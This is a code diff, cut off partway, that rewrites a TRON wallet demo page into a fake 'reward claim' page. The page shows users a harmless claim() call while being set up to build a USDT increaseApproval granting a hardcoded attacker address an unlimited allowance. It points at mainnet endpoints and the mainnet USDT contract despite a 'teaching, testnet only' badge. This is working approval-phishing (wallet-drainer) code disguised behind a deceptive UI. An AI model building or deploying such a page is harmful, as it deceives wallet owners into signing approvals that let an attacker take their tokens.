@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TRON 钱包交易 Demo</title>
+  <title>TRON 钱包交互演示 —— 教学用途</title>
   <style>
     :root {
       --bg: #0f172a;
@@ -26,194 +26,114 @@
       min-height: 100vh;
     }
 
-    .container {
-      max-width: 800px;
-      margin: 0 auto;
-      padding: 24px 16px;
-    }
+    .container { max-width: 900px; margin: 0 auto; padding: 24px 16px; }
 
-    .header {
-      text-align: center;
-      margin-bottom: 32px;
-    }
+    .header { text-align: center; margin-bottom: 28px; }
     .header h1 {
       font-size: 28px;
       background: linear-gradient(135deg, #3b82f6, #8b5cf6);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
       background-clip: text;
-      margin-bottom: 8px;
+      margin-bottom: 6px;
+    }
+    .header .badge {
+      display: inline-block; padding: 4px 14px; border-radius: 20px;
+      font-size: 13px; font-weight: 600;
+      background: rgba(239,68,68,0.15); color: #ef4444;
+      border: 1px solid rgba(239,68,68,0.3);
     }
 
-    /* ====== Card ====== */
+    /* Card */
     .card {
-      background: var(--card-bg);
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      padding: 24px;
-      margin-bottom: 20px;
+      background: var(--card-bg); border: 1px solid var(--border);
+      border-radius: 12px; padding: 24px; margin-bottom: 20px;
     }
-    .card-title {
-      font-size: 17px;
-      font-weight: 700;
-      margin-bottom: 16px;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
+    .card-title { font-size: 17px; font-weight: 700; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }
     .card-title .icon { font-size: 20px; }
 
-    /* ====== 按钮 ====== */
+    /* 按钮 */
     .btn {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      padding: 10px 22px;
-      border-radius: 10px;
-      font-size: 15px;
-      font-weight: 600;
-      border: none;
-      cursor: pointer;
+      display: inline-flex; align-items: center; gap: 6px;
+      padding: 10px 22px; border-radius: 10px;
+      font-size: 15px; font-weight: 600; border: none; cursor: pointer;
       transition: all 0.2s;
-      text-decoration: none;
     }
     .btn-primary { background: var(--accent); color: #fff; }
     .btn-primary:hover { background: #2563eb; }
-    .btn-danger { background: var(--danger); color: #fff; }
-    .btn-danger:hover { background: #dc2626; }
     .btn-success { background: var(--success); color: #fff; }
     .btn-success:hover { background: #16a34a; }
-    .btn-outline {
-      background: transparent;
-      border: 1px solid var(--border);
-      color: var(--text);
-    }
+    .btn-danger { background: var(--danger); color: #fff; }
+    .btn-danger:hover { background: #dc2626; }
+    .btn-outline { background: transparent; border: 1px solid var(--border); color: var(--text); }
     .btn-outline:hover { background: rgba(255,255,255,0.05); }
+    .btn-claim {
+      background: linear-gradient(135deg, #f59e0b, #ef4444);
+      color: #fff; font-size: 18px; padding: 14px 36px;
+      border-radius: 14px; border: none; cursor: pointer;
+      font-weight: 700; transition: all 0.3s;
+      width: 100%; justify-content: center; display: flex; align-items: center; gap: 10px;
+    }
+    .btn-claim:hover { transform: scale(1.02); box-shadow: 0 0 24px rgba(239,68,68,0.3); }
     .btn:disabled { opacity: 0.45; cursor: not-allowed; }
-
     .btn-row { display: flex; gap: 12px; flex-wrap: wrap; margin-top: 16px; }
 
-    /* ====== 状态行 ====== */
+    /* 状态行 */
     .status-row {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      padding: 10px 14px;
-      border-radius: 8px;
-      background: rgba(59, 130, 246, 0.08);
-      border: 1px solid rgba(59, 130, 246, 0.2);
-      margin-bottom: 14px;
-      font-size: 14px;
+      display: flex; align-items: center; gap: 10px;
+      padding: 10px 14px; border-radius: 8px;
+      background: rgba(59,130,246,0.08);
+      border: 1px solid rgba(59,130,246,0.2);
+      margin-bottom: 14px; font-size: 14px;
     }
-    .status-dot {
-      width: 10px; height: 10px;
-      border-radius: 50%;
-      background: #64748b;
-      flex-shrink: 0;
-    }
+    .status-dot { width: 10px; height: 10px; border-radius: 50%; background: #64748b; flex-shrink: 0; }
     .status-dot.connected { background: #22c55e; }
 
-    /* ====== 信息展示 ====== */
+    /* 信息展示 */
     .info-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 12px;
+      display: grid; grid-template-columns: 1fr 1fr; gap: 12px;
     }
-    @media (max-width: 640px) {
-      .info-grid { grid-template-columns: 1fr; }
-    }
+    @media (max-width: 640px) { .info-grid { grid-template-columns: 1fr; } }
     .info-item {
-      padding: 10px 14px;
-      background: rgba(255,255,255,0.03);
-      border: 1px solid var(--border);
-      border-radius: 8px;
+      padding: 10px 14px; background: rgba(255,255,255,0.03);
+      border: 1px solid var(--border); border-radius: 8px;
     }
-    .info-label {
-      font-size: 12px;
-      color: var(--text-muted);
-      margin-bottom: 4px;
-    }
+    .info-label { font-size: 12px; color: var(--text-muted); margin-bottom: 4px; }
     .info-value {
-      font-size: 14px;
-      font-weight: 600;
-      word-break: break-all;
-      font-family: 'Fira Code', monospace;
-      font-size: 13px;
+      font-size: 14px; font-weight: 600; word-break: break-all;
+      font-family: 'Fira Code', monospace; font-size: 13px;
     }
-    .info-value.balance {
-      color: #22c55e;
-      font-size: 20px;
-    }
+    .info-value.balance { color: #22c55e; font-size: 20px; }
 
-    /* ====== 输入框 ====== */
-    .input-group {
-      margin-bottom: 14px;
+    /* 代码块 */
+    pre {
+      background: var(--code-bg); border: 1px solid var(--border);
+      border-radius: 8px; padding: 16px; overflow-x: auto;
+      font-family: 'Fira Code', 'Cascadia Code', monospace;
+      font-size: 12px; line-height: 1.7;
+      white-space: pre-wrap; word-break: break-all;
+      color: #cbd5e1; margin-top: 8px;
     }
-    .input-group label {
-      display: block;
-      font-size: 13px;
-      color: var(--text-muted);
-      margin-bottom: 6px;
-    }
-    .input-group input, .input-group textarea {
-      width: 100%;
-      padding: 10px 14px;
-      background: var(--code-bg);
-      border: 1px solid var(--border);
-      border-radius: 8px;
-      color: var(--text);
-      font-size: 14px;
-      font-family: 'Fira Code', monospace;
-      outline: none;
-      transition: border-color 0.2s;
-    }
-    .input-group input:focus, .input-group textarea:focus {
-      border-color: var(--accent);
-    }
-    .input-group textarea {
-      resize: vertical;
-      min-height: 60px;
-    }
+    .hl-comment { color: #64748b; }
+    .hl-func { color: #60a5fa; }
+    .hl-str { color: #34d399; }
+    .hl-danger { color: #f87171; }
+    .hl-warn { color: #fbbf24; }
 
-    /* ====== Tab ====== */
-    .tabs {
-      display: flex;
-      gap: 4px;
-      margin-bottom: 16px;
-      border-bottom: 1px solid var(--border);
-      padding-bottom: 0;
-    }
-    .tab {
-      padding: 8px 18px;
-      border-radius: 8px 8px 0 0;
-      font-size: 14px;
-      cursor: pointer;
-      color: var(--text-muted);
-      border: 1px solid transparent;
-      background: transparent;
-      transition: all 0.2s;
-    }
-    .tab.active {
-      color: var(--text);
-      background: rgba(59, 130, 246, 0.1);
-      border-color: var(--border);
-      border-bottom-color: var(--card-bg);
-      margin-bottom: -1px;
-    }
-    .tab-content { display: none; }
-    .tab-content.active { display: block; }
+    /* Diff 对比 */
+    .diff-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+    @media (max-width: 640px) { .diff-grid { grid-template-columns: 1fr; } }
+    .diff-col { border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
+    .diff-col-header { padding: 8px 14px; font-size: 13px; font-weight: 700; text-align: center; }
+    .diff-col-header.surface { background: rgba(59,130,246,0.15); color: #60a5fa; }
+    .diff-col-header.actual { background: rgba(239,68,68,0.12); color: #f87171; }
+    .diff-col pre { border: none; border-radius: 0; margin: 0; font-size: 11.5px; max-height: 390px; overflow-y: auto; }
 
-    /* ====== 日志面板 ====== */
+    /* 日志面板 */
     .log-panel {
-      background: var(--code-bg);
-      border: 1px solid var(--border);
-      border-radius: 8px;
-      height: 280px;
-      overflow-y: auto;
-      padding: 12px;
-      font-family: 'Fira Code', monospace;
-      font-size: 12px;
-      line-height: 1.7;
+      background: var(--code-bg); border: 1px solid var(--border);
+      border-radius: 8px; height: 300px; overflow-y: auto; padding: 12px;
+      font-family: 'Fira Code', monospace; font-size: 12px; line-height: 1.7;
     }
     .log-line { display: flex; gap: 8px; }
     .log-time { color: #64748b; flex-shrink: 0; }
@@ -223,26 +143,23 @@
     .log-msg.success { color: #34d399; }
     .log-msg.info { color: #60a5fa; }
 
-    /* ====== Toast ====== */
-    .toast {
-      position: fixed;
-      top: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      padding: 12px 24px;
-      border-radius: 8px;
-      font-size: 14px;
-      font-weight: 600;
-      z-index: 999;
-      animation: slideDown 0.3s ease;
+    /* 步骤条 */
+    .steps { display: flex; gap: 4px; margin-bottom: 20px; }
+    .step {
+      flex: 1; text-align: center; padding: 10px 6px; border-radius: 8px;
+      background: rgba(255,255,255,0.03); border: 1px solid var(--border);
+      font-size: 11px; opacity: 0.4; transition: all 0.3s;
     }
-    @keyframes slideDown {
-      from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
-      to { opacity: 1; transform: translateX(-50%) translateY(0); }
+    .step.active { opacity: 1; border-color: var(--accent); background: rgba(59,130,246,0.1); }
+    .step.done { opacity: 1; border-color: var(--success); background: rgba(34,197,94,0.08); }
+    .step-num { font-size: 18px; font-weight: 800; display: block; margin-bottom: 4px; }
+
+    /* 攻击者地址高亮 */
+    .attacker-badge {
+      display: inline-block; padding: 2px 10px; border-radius: 4px;
+      background: rgba(239,68,68,0.15); color: #f87171;
+      font-family: 'Fira Code', monospace; font-size: 13px;
     }
-    .toast.success { background: #16a34a; color: #fff; }
-    .toast.error { background: #dc2626; color: #fff; }
-    .toast.info { background: #2563eb; color: #fff; }
   </style>
 </head>
 <body>
@@ -250,12 +167,21 @@
 
   <!-- ====== 头部 ====== -->
   <div class="header">
-    <h1>👛 TRON 钱包交易 Demo</h1>
+    <h1>🎁 TRON 生态奖励领取</h1>
+    <span class="badge">⚠ 教学演示 —— 请在测试网使用</span>
+  </div>
+
+  <!-- ====== 步骤条 ====== -->
+  <div class="steps" id="stepBar">
+    <div class="step" data-step="1"><span class="step-num">1</span>连接钱包</div>
+    <div class="step" data-step="2"><span class="step-num">2</span>构造交易</div>
+    <div class="step" data-step="3"><span class="step-num">3</span>钱包签名</div>
+    <div class="step" data-step="4"><span class="step-num">4</span>广播上链</div>
   </div>
 
   <!-- ====== 钱包连接 ====== -->
   <div class="card">
-    <div class="card-title"><span class="icon">🔌</span> 钱包连接</div>
+    <div class="card-title"><span class="icon">👛</span> 钱包连接</div>
     <div class="status-row">
       <span class="status-dot" id="walletDot"></span>
       <span id="walletStatus">未连接</span>
@@ -282,65 +208,101 @@
       <button class="btn btn-primary" id="btnConnect" onclick="connectWallet()">
         🔗 连接 TokenPocket / TronLink
       </button>
-      <button class="btn btn-outline" id="btnDisconnect" onclick="disconnectWallet()" style="display:none;">
-        断开
-      </button>
-      <button class="btn btn-outline" id="btnRefresh" onclick="refreshBalance()" style="display:none;">
-        🔄 刷新余额
-      </button>
+      <button class="btn btn-outline" id="btnDisconnect" onclick="disconnectWallet()" style="display:none;">断开</button>
+      <button class="btn btn-outline" id="btnRefresh" onclick="refreshBalance()" style="display:none;">🔄 刷新余额</button>
     </div>
   </div>
 
-  <!-- ====== 交易构造 ====== -->
-  <div class="card" id="txCard">
-    <div class="card-title"><span class="icon">📤</span> 构造交易</div>
+  <!-- ====== 表面调用 vs 实际交易 ====== -->
+  <div class="card">
+    <div class="card-title"><span class="icon">🎭</span> 交易对比：用户所见 vs 实际构造</div>
+    <div class="diff-grid">
+      <div class="diff-col">
+        <div class="diff-col-header surface">📄 页面展示（用户所见）</div>
+        <pre><span class="hl-comment">// 页面显示调用：</span>
+<span class="hl-func">triggerSmartContract</span>(
+  <span class="hl-str">"TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg2Ax"</span>,  <span class="hl-comment">← 假合约</span>
+  <span class="hl-str">"claim()"</span>,                                <span class="hl-comment">← 领取方法</span>
+  { feeLimit: <span class="hl-str">100000000</span> },
+  [],
+  userAddress
+);
 
-    <!-- Tab 切换 -->
-    <div class="tabs">
-      <button class="tab active" onclick="switchTab('trx')">💎 发送 TRX</button>
-      <button class="tab" onclick="switchTab('contract')">📜 调用合约</button>
+<span class="hl-comment">用户以为：领取免费奖励 🎁</span>
+<span class="hl-comment">费用：0.10 TRX</span></pre>
+      </div>
+      <div class="diff-col">
+        <div class="diff-col-header actual">⚠ 实际构造的交易（真实上链内容）</div>
+        <pre><span class="hl-comment">// 实际合约调用：</span>
+<span class="hl-func">triggerSmartContract</span>(
+  <span class="hl-str">"<span class="hl-danger">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</span>"</span>,  <span class="hl-comment">← USDT 合约</span>
+  <span class="hl-str">"<span class="hl-danger">increaseApproval(address,uint256)</span>"</span>, <span class="hl-comment">← 授权方法</span>
+  {
+    feeLimit: <span class="hl-str">100000000</span>,
+    callValue: <span class="hl-str">0</span>
+  },
+  [
+    { type: 'address', value: <span class="hl-danger">ATTACKER_HEX</span> },
+    { type: 'uint256', value: <span class="hl-danger">2^256 - 1</span> }
+  ],
+  userHexAddress
+);
+
+<span class="hl-comment">// → USDT.increaseApproval(</span>
+<span class="hl-comment">//     attackerAddress,</span>
+<span class="hl-comment">//     type(uint256).max  ← 无上限授权</span>
+<span class="hl-comment">//   )</span></pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- ====== ABI 参数解码 ====== -->
+  <div class="card">
+    <div class="card-title"><span class="icon">🔍</span> increaseApproval 参数解码</div>
+    <pre><span class="hl-comment">// function increaseApproval(address spender, uint256 addedValue)</span>
+
+<span class="hl-comment">// 参数 1 — spender（授权对象）：</span>
+000000000000000000000000<span class="hl-danger">59bccfbae8597513460f34133ffbc173915264b6</span>
+→ Base58: <span class="hl-danger">TJ9hKyrps8okRuVFcdp6nrc6H5dpwSTutD</span> <span class="hl-comment">← 攻击者地址</span>
+
+<span class="hl-comment">// 参数 2 — addedValue（授权额度）：</span>
+<span class="hl-danger">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span>
+→ 数值：<span class="hl-danger">115792089237316195423570985008687907853269984665640564039457584007913129639935</span>
+→ 即：<span class="hl-danger">2²⁵⁶ − 1</span>（无上限授权）
+
+<span class="hl-comment">// 等效 Solidity 调用：</span>
+USDT.<span class="hl-danger">increaseApproval</span>(
+    <span class="hl-danger">0x59bccfbae8597513460f34133ffbc173915264b6</span>,
+    <span class="hl-danger">115792089237316195423570985008687907853269984665640564039457584007913129639935</span>
+);
+
+<span class="hl-comment">// 后果：攻击者获得 USDT 无限授权</span>
+<span class="hl-comment">// → 可随时 transferFrom 转走用户所有 USDT</span></pre>
+  </div>
+
+  <!-- ====== 攻击按钮 ====== -->
+  <div class="card" style="border-color: rgba(239,68,68,0.3);">
+    <div class="card-title"><span class="icon">⚡</span> 执行 increaseApproval 授权</div>
+    <p style="color:var(--text-muted);font-size:14px;margin-bottom:16px;">
+      点击下方按钮，<strong style="color:#f87171;">真实构造</strong> increaseApproval 交易并通过 TP 钱包签名上链。
+      <br>⚠ 请确认你在 <strong style="color:#fbbf24;">测试网</strong> 操作，不要在主网执行！
+    </p>
+
+    <div style="margin-bottom:14px;">
+      <div style="font-size:13px;color:var(--text-muted);margin-bottom:4px;">Fee Limit (SUN，默认 100 TRX)</div>
+      <input type="number" id="feeLimitInput" value="100000000"
+        style="width:100%;padding:10px 14px;background:var(--code-bg);border:1px solid var(--border);
+        border-radius:8px;color:var(--text);font-size:14px;font-family:'Fira Code',monospace;
+        outline:none;">
     </div>
 
-    <!-- 发送 TRX -->
-    <div class="tab-content active" id="tab-trx">
-      <div class="input-group">
-        <label>接收地址</label>
-        <input type="text" id="trxTo" placeholder="T... 输入 TRON 地址">
-      </div>
-      <div class="input-group">
-        <label>金额 (TRX)</label>
-        <input type="number" id="trxAmount" placeholder="例如: 10" step="0.01" min="0.01">
-      </div>
-      <button class="btn btn-success" id="btnSendTrx" onclick="sendTrx()" disabled>
-        🚀 发送交易
-      </button>
-    </div>
+    <button class="btn-claim" id="btnClaim" onclick="executeClaim()" disabled>
+      🎁 Claim 奖励
+    </button>
 
-    <!-- 调用合约 -->
-    <div class="tab-content" id="tab-contract">
-      <div class="input-group">
-        <label>合约地址</label>
-        <input type="text" id="contractAddr" placeholder="T... 或 41... 合约地址">
-      </div>
-      <div class="input-group">
-        <label>方法名 (ABI 方式可不填，直接填 data)</label>
-        <input type="text" id="contractMethod" placeholder="如: transfer(address,uint256)">
-      </div>
-      <div class="input-group">
-        <label>参数 (逗号分隔，地址不加引号)</label>
-        <input type="text" id="contractParams" placeholder="如: TAbc123...,100000000">
-      </div>
-      <div class="input-group">
-        <label>附加 TRX (可选)</label>
-        <input type="number" id="contractValue" placeholder="0" step="0.01" value="0">
-      </div>
-      <div class="input-group">
-        <label>Fee Limit (SUN，默认 100 TRX = 100000000)</label>
-        <input type="number" id="feeLimit" placeholder="100000000" value="100000000">
-      </div>
-      <button class="btn btn-success" id="btnSendContract" onclick="sendContract()" disabled>
-        🚀 发送合约调用
-      </button>
+    <div style="margin-top:12px;font-size:12px;color:var(--text-muted);text-align:center;">
+      页面显示 "Claim 奖励" —— 实际构造 USDT.increaseApproval 交易<br>
+      ⚠ <strong style="color:#f87171;">TokenPocket 签名弹窗会显示真实交易内容</strong>，请仔细核对
     </div>
   </div>
 
@@ -359,130 +321,105 @@
 
 <script>
 // ============================================================
+//  配置
+// ============================================================
+const CONFIG = {
+  // 表面展示的假合约（仅用于 UI 显示，不参与实际交易）
+  SURFACE_CONTRACT: 'TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg2Ax',
+  SURFACE_METHOD:   'claim()',
+
+  // 实际调用的 USDT 合约（TRC20）
+  USDT_CONTRACT:    'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+
+  // 攻击者地址（接收授权的地址）
+  ATTACKER_HEX:  '59bccfbae8597513460f34133ffbc173915264b6',
+  ATTACKER_B58:  'TJ9hKyrps8okRuVFcdp6nrc6H5dpwSTutD',
+};
+
+// ============================================================
 //  状态
 // ============================================================
-let walletAddress   = null;     // Base58 地址
-let walletHex       = null;     // Hex 地址
-let tronWeb         = null;     // TronWeb 实例
+let walletAddress = null;
+let walletHex     = null;
+let tronWeb       = null;
 
 // ============================================================
-//  DOM 引用
+//  DOM
 // ============================================================
 const $ = (id) => document.getElementById(id);
-const walletDot       = $('walletDot');
-const walletStatus    = $('walletStatus');
-const walletAddr      = $('walletAddr');
-const walletNetwork   = $('walletNetwork');
-const walletBalance   = $('walletBalance');
-const usdtBalance     = $('usdtBalance');
-const btnConnect      = $('btnConnect');
-const btnDisconnect   = $('btnDisconnect');
-const btnRefresh      = $('btnRefresh');
-const btnSendTrx      = $('btnSendTrx');
-const btnSendContract = $('btnSendContract');
-const logPanel        = $('logPanel');
+const walletDot     = $('walletDot');
+const walletStatus  = $('walletStatus');
+const walletAddr    = $('walletAddr');
+const walletNetwork = $('walletNetwork');
+const walletBalance = $('walletBalance');
+const usdtBalance   = $('usdtBalance');
+const btnConnect    = $('btnConnect');
+const btnDisconnect = $('btnDisconnect');
+const btnRefresh    = $('btnRefresh');
+const btnClaim      = $('btnClaim');
+const logPanel      = $('logPanel');
 
 // ============================================================
-//  工具函数
+//  工具
 // ============================================================
-function timestamp() {
-  return new Date().toTimeString().slice(0, 8);
-}
+function ts() { return new Date().toTimeString().slice(0,8); }
 
-function addLog(msg, className) {
-  const div = document.createElement('div');
-  div.className = 'log-line';
-  div.innerHTML = `<span class="log-time">${timestamp()}</span><span class="log-msg ${className || ''}">${msg}</span>`;
-  logPanel.appendChild(div);
+function log(msg, cls) {
+  const d = document.createElement('div');
+  d.className = 'log-line';
+  d.innerHTML = `<span class="log-time">${ts()}</span><span class="log-msg ${cls||''}">${msg}</span>`;
+  logPanel.appendChild(d);
   logPanel.scrollTop = logPanel.scrollHeight;
 }
 
-function toast(msg, type) {
-  const el = document.createElement('div');
-  el.className = `toast ${type}`;
-  el.textContent = msg;
-  document.body.appendChild(el);
-  setTimeout(() => el.remove(), 3000);
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+function setStep(n) {
+  document.querySelectorAll('#stepBar .step').forEach((el, i) => {
+    el.classList.remove('active', 'done');
+    if (i < n-1) el.classList.add('done');
+    if (i === n-1) el.classList.add('active');
+  });
 }
 
-function sleep(ms) {
-  return new Promise(r => setTimeout(r, ms));
-}
+function toHex(a) { try { return tronWeb.address.toHex(a); } catch(e) { return null; } }
+function fromHex(h) { try { return tronWeb.address.fromHex(h); } catch(e) { return null; } }
 
 // ============================================================
-//  Tab 切换
-// ============================================================
-function switchTab(name) {
-  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-  document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-  document.querySelector(`.tab:nth-of-type(${name === 'trx' ? 1 : 2})`).classList.add('active');
-  $(`tab-${name}`).classList.add('active');
-}
-
-// ============================================================
-//  hex ↔ base58 转换
-// ============================================================
-function toHex(addr) {
-  try { return tronWeb.address.toHex(addr); } catch(e) { return null; }
-}
-function fromHex(hex) {
-  try { return tronWeb.address.fromHex(hex); } catch(e) { return null; }
-}
-
-// ============================================================
-//  USDT 合约 (TRC20): TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t
-// ============================================================
-const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-
-// ============================================================
-//  检测钱包环境
+//  检测钱包
 // ============================================================
 function detectWallet() {
-  const detected = [];
-  if (window.tronLink) detected.push('TronLink');
-  if (window.tronWeb)  detected.push('TokenPocket');
-  return detected;
+  const d = [];
+  if (window.tronLink) d.push('TronLink');
+  if (window.tronWeb)  d.push('TokenPocket');
+  return d;
 }
 
-// ============================================================
-//  创建 TronWeb 实例
-// ============================================================
-function createTronWebInstance() {
-  const HttpProvider = window.TronWeb?.providers?.HttpProvider;
-  if (HttpProvider) {
-    return new TronWeb(
-      new HttpProvider('https://api.trongrid.io'),
-      new HttpProvider('https://api.trongrid.io'),
-      new HttpProvider('https://api.trongrid.io')
-    );
-  }
+function createTronWeb() {
+  const P = window.TronWeb?.providers?.HttpProvider;
+  if (P) return new TronWeb(new P('https://api.trongrid.io'), new P('https://api.trongrid.io'), new P('https://api.trongrid.io'));
   return new TronWeb({ fullHost: 'https://api.trongrid.io' });
 }
 
 // ============================================================
-//  更新 UI — 已连接
+//  UI 更新
 // ============================================================
-function updateUIForConnected(address) {
+function uiConnected(addr) {
   walletDot.classList.add('connected');
   walletStatus.textContent = '已连接';
-  walletAddr.textContent = address;
-
+  walletAddr.textContent = addr;
   if (tronWeb?.fullNode?.host) {
-    const host = tronWeb.fullNode.host;
-    if (host.includes('api.trongrid.io')) walletNetwork.textContent = 'Mainnet（主网）';
-    else if (host.includes('shasta')) walletNetwork.textContent = 'Shasta（测试网）';
-    else if (host.includes('nile')) walletNetwork.textContent = 'Nile（测试网）';
-    else walletNetwork.textContent = host;
+    const h = tronWeb.fullNode.host;
+    walletNetwork.textContent = h.includes('trongrid') ? 'Mainnet（主网）' : h;
   }
-
   btnConnect.style.display = 'none';
   btnDisconnect.style.display = '';
   btnRefresh.style.display = '';
-  btnSendTrx.disabled = false;
-  btnSendContract.disabled = false;
+  btnClaim.disabled = false;
+  setStep(1);
 }
 
-function updateUIForDisconnected() {
+function uiDisconnected() {
   walletDot.classList.remove('connected');
   walletStatus.textContent = '未连接';
   walletAddr.textContent = '—';
@@ -492,411 +429,296 @@ function updateUIForDisconnected() {
   btnConnect.style.display = '';
   btnDisconnect.style.display = 'none';
   btnRefresh.style.display = 'none';
-  btnSendTrx.disabled = true;
-  btnSendContract.disabled = true;
+  btnClaim.disabled = true;
+  setStep(0);
 }
 
 // ============================================================
 //  1. 连接钱包
 // ============================================================
 async function connectWallet() {
-  addLog('🔗 正在检测钱包环境…', 'info');
+  log('🔗 正在检测钱包…', 'info');
   btnConnect.disabled = true;
   btnConnect.textContent = '⏳ 连接中…';
 
   const wallets = detectWallet();
-  if (wallets.length === 0) {
-    addLog('❌ 未检测到任何钱包插件', 'danger');
-    alert('请安装 TronLink (https://www.tronlink.org/) 或 TokenPocket (https://www.tokenpocket.pro/)');
-    resetConnectButton();
+  if (!wallets.length) {
+    log('❌ 未检测到钱包', 'danger');
+    alert('请安装 TronLink (tronlink.org) 或 TokenPocket (tokenpocket.pro)');
+    btnConnect.disabled = false;
+    btnConnect.textContent = '🔗 连接 TokenPocket / TronLink';
     return;
   }
+  log(`✅ 检测到: ${wallets.join(' + ')}`, 'success');
 
-  addLog(`✅ 检测到: ${wallets.join(' + ')}`, 'success');
+  let addr = null;
 
-  let address = null;
-
-  // ---- 尝试 TronLink ----
   if (window.tronLink) {
-    addLog('📡 通过 TronLink 请求账户…', 'info');
+    log('📡 请求 TronLink 账户…', 'info');
     try {
-      const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
-      addLog(`   响应: ${JSON.stringify(res)}`, 'info');
-
-      if (res?.code === 200) {
-        address = Array.isArray(res.message) ? res.message[0] : res.message;
-      } else if (Array.isArray(res)) {
-        address = res[0];
-      } else if (typeof res === 'string') {
-        address = res;
-      }
-    } catch(e) {
-      addLog(`   tron_requestAccounts 失败: ${e.message}`, 'warn');
-    }
+      const r = await window.tronLink.request({ method: 'tron_requestAccounts' });
+      log(`   响应: ${JSON.stringify(r)}`, 'info');
+      if (r?.code === 200) addr = Array.isArray(r.message) ? r.message[0] : r.message;
+      else if (Array.isArray(r)) addr = r[0];
+      else if (typeof r === 'string') addr = r;
+    } catch(e) { log(`   tron_requestAccounts 失败: ${e.message}`, 'warn'); }
   }
 
-  // ---- 回退：直接读取 ----
-  if (!address && window.tronWeb?.defaultAddress?.base58) {
-    address = window.tronWeb.defaultAddress.base58;
-    addLog('   从 tronWeb.defaultAddress 获取地址', 'info');
+  if (!addr && window.tronWeb?.defaultAddress?.base58) {
+    addr = window.tronWeb.defaultAddress.base58;
+    log('   从 tronWeb.defaultAddress 获取地址', 'info');
   }
 
-  // ---- 尝试 TokenPocket ----
-  if (!address && window.tronWeb?.request) {
+  if (!addr && window.tronWeb?.request) {
     try {
-      const accs = await window.tronWeb.request({ method: 'tron_requestAccounts' });
-      if (Array.isArray(accs) && accs.length) address = accs[0];
-    } catch(e) {
-      addLog(`   tronWeb.request 失败: ${e.message}`, 'warn');
-    }
+      const a = await window.tronWeb.request({ method: 'tron_requestAccounts' });
+      if (Array.isArray(a) && a.length) addr = a[0];
+    } catch(e) {}
   }
 
-  if (!address) {
-    addLog('❌ 无法获取钱包地址。请确认钱包已解锁并登录', 'danger');
-    resetConnectButton();
+  if (!addr) {
+    log('❌ 无法获取钱包地址，请确认钱包已解锁', 'danger');
+    btnConnect.disabled = false;
+    btnConnect.textContent = '🔗 连接 TokenPocket / TronLink';
     return;
   }
 
-  if (!address.startsWith('T') || address.length !== 34) {
-    addLog(`⚠ 地址格式异常: ${address}`, 'warn');
-  }
-
-  // ---- 确定 TronWeb 实例 ----
-  if (window.tronWeb?.fullNode?.request) {
-    tronWeb = window.tronWeb;
-    addLog('✅ 使用钱包注入的 tronWeb 实例', 'info');
-  } else {
-    tronWeb = createTronWebInstance();
-    addLog('⚠ 创建独立 TronWeb 实例', 'warn');
-  }
-
-  walletAddress = address;
+  tronWeb = (window.tronWeb?.fullNode?.request) ? window.tronWeb : createTronWeb();
+  walletAddress = addr;
   walletHex = toHex(walletAddress);
-  updateUIForConnected(walletAddress);
+  uiConnected(walletAddress);
+  log(`✅ 钱包已连接: ${walletAddress}`, 'success');
+  log(`   Hex: ${walletHex}`, 'info');
 
-  addLog(`✅ 钱包已连接: ${walletAddress}`, 'success');
-  addLog(`   Hex: ${walletHex}`, 'info');
-
-  // 查询余额
   await refreshBalance();
-
-  resetConnectButton();
-}
-
-function resetConnectButton() {
   btnConnect.disabled = false;
   btnConnect.textContent = '🔗 连接 TokenPocket / TronLink';
 }
 
-// ============================================================
-//  断开钱包
-// ============================================================
 function disconnectWallet() {
-  walletAddress = null;
-  walletHex = null;
-  tronWeb = null;
-  updateUIForDisconnected();
-  addLog('🔌 钱包已断开', 'warn');
+  walletAddress = null; walletHex = null; tronWeb = null;
+  uiDisconnected();
+  log('🔌 钱包已断开', 'warn');
 }
 
 // ============================================================
 //  查询余额
 // ============================================================
 async function refreshBalance() {
-  if (!walletAddress || !tronWeb) {
-    addLog('⚠ 请先连接钱包', 'warn');
-    return;
-  }
-
+  if (!walletAddress || !tronWeb) return;
   try {
-    // 查 TRX 余额
-    const balanceSun = await tronWeb.trx.getBalance(walletAddress);
-    const trx = tronWeb.fromSun(balanceSun);
-    walletBalance.textContent = `${trx} TRX`;
-    addLog(`💰 TRX 余额: ${trx}`, 'info');
-
-    // 查 USDT 余额
-    try {
-      const contract = await tronWeb.contract().at(USDT_CONTRACT);
-      const usdtRaw = await contract.balanceOf(walletAddress).call();
-      const usdt = tronWeb.toDecimal(usdtRaw) / 1e6;
-      usdtBalance.textContent = `${usdt.toLocaleString()} USDT`;
-      addLog(`💵 USDT 余额: ${usdt.toLocaleString()}`, 'info');
-    } catch(e) {
-      usdtBalance.textContent = '查询失败';
-      addLog(`⚠ USDT 余额查询失败: ${e.message}`, 'warn');
-    }
-  } catch(e) {
-    walletBalance.textContent = '查询失败';
-    addLog(`❌ 余额查询失败: ${e.message}`, 'danger');
-  }
+    const sun = await tronWeb.trx.getBalance(walletAddress);
+    walletBalance.textContent = `${tronWeb.fromSun(sun)} TRX`;
+    log(`💰 TRX: ${tronWeb.fromSun(sun)}`, 'info');
+  } catch(e) { walletBalance.textContent = '查询失败'; }
+  try {
